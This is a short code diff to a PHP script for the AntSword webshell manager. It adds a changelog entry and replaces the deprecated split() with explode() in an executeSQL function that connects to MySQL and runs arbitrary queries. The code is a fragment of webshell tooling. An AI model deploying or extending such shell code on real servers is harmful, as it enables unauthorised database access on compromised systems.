@@ -24,6 +24,9 @@
 *  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
 *
 * ChangeLog:
+*   Data: 2021/04/10 v1.5.1
+*    1. 修复 PHP 类型数据库连接在PHP7下函数废除引起的问题
+*
 *   Data: 2021/02/24 v1.5
 *    1. 修复 5.2.* 版本语法不兼容问题
 *
@@ -146,7 +149,7 @@ function executeSQL($encode, $conf, $sql, $columnsep, $rowsep, $needcoluname){
         $password = $data[1];    
     }
     $encode = decode(EC($encode));
-    list($host, $port) = split(":", $host);
+    list($host, $port) = explode(":", $host);
     $port == "" ? $port = "3306" : $port;
     $conn = @mysqli_connect($host, $user, $password, "", $port);
     $res = @mysqli_query($conn, $sql);
